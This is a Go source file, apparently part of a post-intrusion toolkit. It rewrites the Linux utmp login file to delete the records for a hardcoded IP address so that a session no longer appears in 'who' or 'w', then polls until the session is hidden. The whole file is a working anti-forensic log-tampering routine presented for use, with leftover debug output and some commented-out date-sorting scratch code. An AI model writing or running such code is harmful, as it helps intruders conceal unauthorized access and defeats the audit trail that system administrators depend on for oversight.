package utmp

// This shit Clears the "who" and the "w" command. Its supposed that works.
// God knows how.
import (
	"bufio"
	"bytes"
	"encoding/binary"
	"fmt"
	"io"
	"os"
	"os/exec"
	"regexp"
	"sort"
	"strings"
	check "test/CHECK"
	vars "test/VARS"
	"time"
)

func ClearUTMP(ip, user string) []vars.DataLogin {
	myDataLogin := []vars.DataLogin{}
	d := GetWho(ip, user)
	euid := os.Geteuid()
	fmt.Println(euid)
	fmt.Println(d)

	d = ShortDataLogin(d)
	fmt.Println(d)
	if euid == 0 {
		myDataLogin = append(myDataLogin, d[0], d[1])
	} else {
		myDataLogin = append(myDataLogin, d[0])
	}
	// Pouse()
	StartToClearUTMP()
	// Pouse()
	CheckMe(myDataLogin, ip, user)
	time.Sleep(10 * time.Second)
	return myDataLogin
}

func CheckMe(d []vars.DataLogin, ip, user string) {
	for {
		res := CheckifLogout(d, ip, user)
		if !res {

			fmt.Println("I AM OUT")
			break
		} else {
			fmt.Println("i am logged in")
		}
		time.Sleep(500 * time.Millisecond)
	}
}

func GetWho(ip, user string) []vars.DataLogin {
	cmd := exec.Command("who")
	var out bytes.Buffer
	cmd.Stdout = &out
	err := cmd.Run()
	if err != nil {
		fmt.Println("Error executing command:", err)
		return []vars.DataLogin{}
	}

	outSpit := strings.Split(out.String(), "\n")
	pattern := fmt.Sprintf(`^(.*%s).*(pts/\d+).*(%s)`, user, ip)
	re, err := regexp.Compile(pattern)
	check.Check("Error on Compile PAtern UTMP", err)
	d := []vars.DataLogin{}
	for _, j := range outSpit {
		match := re.MatchString(j)
		if match {
			sp := strings.Fields(j)
			d = append(d, vars.DataLogin{Username: sp[0], Datetime: sp[2] + " " + sp[3], Ip: sp[4], PTY: sp[1]})
		}
	}
	return d
}

func CheckifLogout(myData []vars.DataLogin, ip, user string) bool {
	// breakFor := false
	// for {
	whoData := GetWho(ip, user)
	for _, j := range whoData {
		for _, d := range myData {
			if j.Datetime == d.Datetime && j.Ip == d.Ip && j.PTY == d.PTY && j.Username == d.Username {
				return true
			}
		}
	}
	return false
}

func ShortDataLogin(events []vars.DataLogin) []vars.DataLogin {

	layout := "2006-01-02 15:04"

	// Sort the slice of structs in descending order based on the Time field
	sort.Slice(events, func(i, j int) bool {
		timeI, err1 := time.Parse(layout, events[i].Datetime)
		timeJ, err2 := time.Parse(layout, events[j].Datetime)
		if err1 != nil || err2 != nil {
			fmt.Println("Error parsing time string:", err1, err2)
			return false
		}
		return timeI.After(timeJ)
	})

	return events
}

func StartToClearUTMP() {

	file, err := os.Open(vars.UTMP_FILE)

	if err != nil {
		fmt.Println("Error opening utmp file:", err)
		return
	}
	defer file.Close()

	// Read and parse the utmp entries
	count := 0
	found := []int{}
	for {
		var entry vars.Utmp
		err = binary.Read(file, binary.LittleEndian, &entry)
		if err != nil {
			break
		}

		// Convert byte arrays to strings
		line := bytes.Trim(entry.Device[:], "\x00")
		// user := bytes.Trim(entry.User[:], "\x00")
		host := bytes.Trim(entry.Host[:], "\x00")
		fmt.Println(entry.Time, "<<<<<<<<<<<<<<<<<<<<<", line)
		count += 1

		if string(host) == "192.168.23.23" {
			found = append(found, count)
			fmt.Println(count)
		}
	}

	sort.Slice(found, func(i, j int) bool {
		return found[i] > found[j]
	})
	fmt.Println(found)

	for _, j := range found {
		startPosition := int64((j - 1) * vars.UTMP_SIZE)
		fileInfo, err := file.Stat()
		if err != nil {
			fmt.Println("Error getting file info:", err)
			return
		}
		originalSize := fileInfo.Size()
		endPosition := startPosition + int64(vars.UTMP_SIZE)
		if endPosition > originalSize {
			fmt.Println("End position exceeds file size. Cannot remove 384 bytes.")
			return
		}

		// Read the part before the start position
		before := make([]byte, startPosition)
		_, err = file.ReadAt(before, 0)
		if err != nil && err != io.EOF {
			fmt.Println("Error reading file:", err)
			return
		}
		// Read the part after the 50 bytes to be removed
		after := make([]byte, originalSize-endPosition)
		_, err = file.ReadAt(after, endPosition)
		if err != nil && err != io.EOF {
			fmt.Println("Error reading file:", err)
			return
		}
		fmt.Println(originalSize)
		// Combine the parts before and after the 50 bytes to be removed
		newContent := append(before, after...)

		// Write the new content back to the file
		err = os.WriteFile(vars.UTMP_FILE, newContent, 0644)
		if err != nil {
			fmt.Println("Error writing file:", err)
			return
		}
	}
}

func Pouse() {
	fmt.Println("Press any key to continue...")

	// Create a new reader
	reader := bufio.NewReader(os.Stdin)

	// Read a single character from the input
	_, _, err := reader.ReadRune()
	if err != nil {
		fmt.Println("Error reading input:", err)
		return
	}

	fmt.Println("Continuing...")
}

// package main

// import (
// 	"fmt"
// 	"sort"
// 	"time"
// )

// func main() {
// 	// Define the date-time strings
// 	timeStrings := []string{
// 		"2024-06-26 09:21",
// 		"2024-06-26 10:45",
// 		"2024-06-25 15:30",
// 		"2024-06-26 08:00",
// 	}

// 	// Define the layout for parsing the date-time strings
// 	layout := "2006-01-02 15:04"

// 	// Parse the date-time strings into time.Time objects
// 	times := make([]time.Time, len(timeStrings))
// 	for i, timeStr := range timeStrings {
// 		parsedTime, err := time.Parse(layout, timeStr)
// 		if err != nil {
// 			fmt.Println("Error parsing time string:", timeStr, "Error:", err)
// 			return
// 		}
// 		times[i] = parsedTime
// 	}

// 	// Sort the time.Time objects in descending order
// 	sort.Slice(times, func(i, j int) bool {
// 		return times[i].After(times[j])
// 	})

// 	// Convert the sorted time.Time objects back to strings
// 	sortedTimeStrings := make([]string, len(times))
// 	for i, t := range times {
// 		sortedTimeStrings[i] = t.Format(layout)
// 	}

// 	// Print the sorted date-time strings
// 	fmt.Println("Sorted date-time strings in descending order:")
// 	for _, timeStr := range sortedTimeStrings {
// 		fmt.Println(timeStr)
// 	}
// }

// package main

// import (
// 	"fmt"
// 	"time"
// )

// func main() {
// 	// Define the date-time strings
// 	timeStr1 := "2024-06-26 09:21"
// 	timeStr2 := "2024-06-26 10:45"

// 	// Define the layout for parsing the date-time strings
// 	layout := "2006-01-02 15:04"

// 	// Parse the date-time strings into time.Time objects
// 	time1, err1 := time.Parse(layout, timeStr1)
// 	time2, err2 := time.Parse(layout, timeStr2)

// 	// Check for parsing errors
// 	if err1 != nil {
// 		fmt.Println("Error parsing timeStr1:", err1)
// 		return
// 	}
// 	if err2 != nil {
// 		fmt.Println("Error parsing timeStr2:", err2)
// 		return
// 	}

// 	// Compare the two time.Time objects
// 	if time1.After(time2) {
// 		fmt.Println(timeStr1, "is the newest time.")
// 	} else if time1.Before(time2) {
// 		fmt.Println(timeStr2, "is the newest time.")
// 	} else {
// 		fmt.Println("Both times are equal.")
// 	}
// }
